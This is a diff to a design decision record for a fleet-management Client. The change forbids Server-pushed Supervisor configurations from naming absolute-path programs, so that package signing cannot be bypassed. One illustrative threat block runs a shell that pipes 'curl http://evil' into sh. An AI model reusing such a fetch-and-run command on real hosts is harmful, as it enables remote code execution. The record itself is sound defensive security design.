@@ -139,6 +139,55 @@ Two mechanics constrain the design:
   truth the fleet view shows. Wherever a Server-delivered Supervisor set is persisted, that
   report must keep being true.
 
+### A pushed block is a different principal
+
+Point 10 validates the merged document "by the same loader that validates `client.toml`
+at startup (block schema, program-path resolution, ports, timeouts)."
+That reuse alone leaves a gap.
+`resolve_program` (`crates/client/src/config.rs`) accepts two shapes: a **bare file name**, which
+lives in `<supervisor_dir>/<name>/program/` — a directory this Client creates and owns, and the
+whole of the host's consent to being updated (point 2) — and an **absolute path**,
+which is *the machine's* program, spawned but never written to (`owned = false`). Both are
+legitimate in a `client.toml` **the operator wrote**, because the operator owns the host and may
+point a Supervisor at any binary on it.
+
+A Server-pushed block is a different principal. Were an absolute path accepted from an offered
+document, a Server — or anyone who has compromised one, *without* the package-signing key — could
+push:
+
+```toml
+[[supervisor]]
+type = "command"
+name = "x"
+command = "/bin/sh"
+args = ["-c", "curl http://evil | sh"]
+```
+
+and the Client would spawn it. That is fleet-wide command execution as the Client's user (root under a
+service install) that needs **no** Ed25519 signature and no content hash — it side-steps the entire
+`[packages] verification_key` machinery the rest of the Client enforces. A security review raised it:
+`crates/client/src/reconfigure.rs` calls `validate_block`, which resolves the program the ordinary
+way and by itself imposes no owned-only rule.
+
+The forces:
+
+- **The operator's file and the Server's push are different trust levels.** Point 9
+  already draws this line for *globals* — endpoint, credentials, and `state_dir` are the host's
+  trust anchors and the Server must never write them. The program a Supervisor spawns is the same
+  kind of anchor: naming an arbitrary absolute path *is* choosing what code runs on the host, which
+  is precisely what admission (ADR-0013) plus package signing (ADR-0015/0018) exist to gate.
+- **Package delivery already has a consent model.** A bare name means "this Client owns the
+  directory, so the Server may install here". A pushed Supervisor whose program is a bare name is
+  therefore *already* consenting to run Server-delivered, signature-verified artifacts — nothing
+  more is needed for the Server to put a program there legitimately.
+- **An absolute path adds nothing the fleet path needs.** A Server-managed Supervisor exists to run
+  what the Server delivers; pointing it at a pre-existing machine binary is the operator's local
+  concern, not a fleet rollout. Refusing absolute paths in a pushed block costs the delivery path no
+  capability it is meant to have.
+- **The globals argument does not cover the program.** The reasoning about the Supervisor set treats
+  globals as trust anchors; the program path inside a block is carried along by "the same loader",
+  not decided on its own merits. The owned-only rule decides it.
+
 ## Decision
 
 ### The Supervisor's directory and its program
@@ -300,6 +349,21 @@ to let a remote configuration touch anything else in the file.
    for Supervisors on that Client, which is the point, and the reason the offer is compared
    against the *file*, not against the last offer.
 
+15. **A Server-offered block names only a Client-owned program.** The Client refuses a
+   Server-offered Supervisor set in which any `[[supervisor]]` block names a program that is not
+   this Client's own — i.e. the program (and, for a tree, its `program_path`) must resolve to a
+   **bare file name** (`owned = true`), never an absolute path. The refusal is a validation failure
+   of the whole offer: nothing is stopped, nothing is written, the running set stays in force, and
+   the self-Agent reports the offer `FAILED` with a reason that names the offending block and
+   program (point 13). This tightens point 10: the merged document is still
+   validated by the startup loader, and then the offered blocks additionally must all be `owned`.
+
+16. **The rule binds only the delivery path.** A `[[supervisor]]` block an operator writes
+   in `client.toml` on the host keeps accepting an absolute path — the operator owns the host, and
+   point 14 ("no offer, no change") is unaffected. The distinction is enforced in the
+   apply path (`reconfigure.rs`), which knows the blocks came from an offer, not in
+   `resolve_program`, which cannot and must not tell the two principals apart.
+
 ## Alternatives considered
 
 ### The program path and package consent
@@ -377,6 +441,23 @@ to let a remote configuration touch anything else in the file.
   documents *as* commented prose (the shipped example config) — the file would stop being the
   operator's after the first apply. The dependency is the price of point 12's "remains
   the operator's file"; cargo's own manifest editing is the precedent that it is fit for this.
+- **Leave a pushed block's program unchecked — the Server is trusted to manage Agents.** Rejected:
+  it makes the whole package-signing apparatus decorative. The threat is a Server compromised below
+  the signing key (a leaked REST credential, a mis-scoped operator); signing is meant to keep such
+  an actor from running arbitrary code, and an unsigned absolute-path spawn is the exact bypass.
+  Admission is a fleet-wide trust boundary (ADR-0013), but that boundary is about *identity between
+  Agents*, not a licence for the Server to run any binary on every host.
+- **Allowlist specific absolute paths in `client.toml`.** Rejected: it reintroduces host-local
+  policy the operator would have to maintain per host, and the fleet path has no need of absolute
+  paths at all — the bare-name/owned case already covers everything a Server-delivered Supervisor
+  does. A configurable escape hatch is complexity for a capability with no established use.
+- **Enforce the owned-only rule inside `resolve_program` for every caller.** Rejected: it would
+  break the operator's own legitimate absolute-path Supervisors written in `client.toml`, which
+  point 14 preserves. The constraint belongs to the *principal* (Server push), not to
+  path resolution, so it lives in the apply path that knows the principal.
+- **Warn and apply anyway.** Rejected: a warning on a code-execution boundary is not a control. The
+  offer is refused as a whole, consistent with how a merge that fails validation is treated (point
+  10).
 
 ## Sources / Prior art
 
@@ -394,6 +475,10 @@ to let a remote configuration touch anything else in the file.
   (checked 2026-08-12) — the established remote-plus-local merge, with explicit precedence
   control (`agent.config_files` placeholders). Taken: the merge and the local-wins boundary for
   host-local settings. Not taken: the separate storage of the remote part (see Alternatives).
+- **OpAMP Supervisor (opamp-go) and the Collector's Supervisor** deliver an *agent the Supervisor
+  itself owns and installs*; they do not offer "run this arbitrary host binary" as a remote-config
+  primitive — the managed executable is the Supervisor's own, which is the owned-only shape the
+  delivery rule makes mandatory for the pushed case.
 - **Elastic Agent** — versioned home directory plus a symlink to the active executable, the shape
   ADR-0010 already follows for the Client itself; consulted for whether Managed Processes should get
   the same (decided against, for now).
@@ -415,6 +500,8 @@ to let a remote configuration touch anything else in the file.
   TOML editing; what `cargo add`/`cargo-edit` mutate manifests with.
 - The general principle behind the path rule — make the illegal state unrepresentable rather than
   validate it — is what removes a whole class of configuration error instead of reporting it.
+- The consent-by-ownership model the delivery rule builds on is the bare-name rule above together
+  with ADR-0015/0018 (signed, hash-verified delivery).
 - In-repo: ADR-0011 (the `[[supervisor]]` blocks), ADR-0012 and ADR-0028 (the Server-side
   delivery path the Supervisor set completes), ADR-0018 (the self-Agent), ADR-0014 (the pattern of
   a verified, persisted Server offer changing what the Client runs).
@@ -514,3 +601,17 @@ to let a remote configuration touch anything else in the file.
   point 9 suggests a dedicated editor rather than a free-text body); the reserved
   `SIGHUP` configuration reload ([`runtime.rs`](../../crates/client/src/service/runtime.rs#L329-L338))
   could reuse point 11's diff-apply for local edits.
+- Positive: the package-signing trust model holds even against a Server compromised below the
+  signing key — a pushed Supervisor set can only ever run Client-owned programs, which are
+  themselves delivered as signature/hash-verified packages. The delivery path's code-execution
+  surface collapses to exactly what the bare-name rule already consents to.
+- Positive: the operator's local authority is unchanged — an absolute-path Supervisor in a
+  hand-written `client.toml` still runs. The two principals are treated as the two trust levels
+  they are, matching the globals boundary of point 9.
+- Negative / trade-offs: a Server cannot deliver a Supervisor that runs a pre-existing machine
+  binary. This is an intentional loss of a capability that had no fleet-shaped use and a real
+  code-execution risk; an operator who genuinely wants a Supervisor over a machine binary writes
+  that block locally.
+- Follow-ups: a regression test that a pushed set with an absolute-path program is refused `FAILED`
+  and touches neither the running set nor the file; the shipped example `client.toml` prose and the
+  rollout/client manuals note that Server-delivered Supervisor blocks must name a bare program.
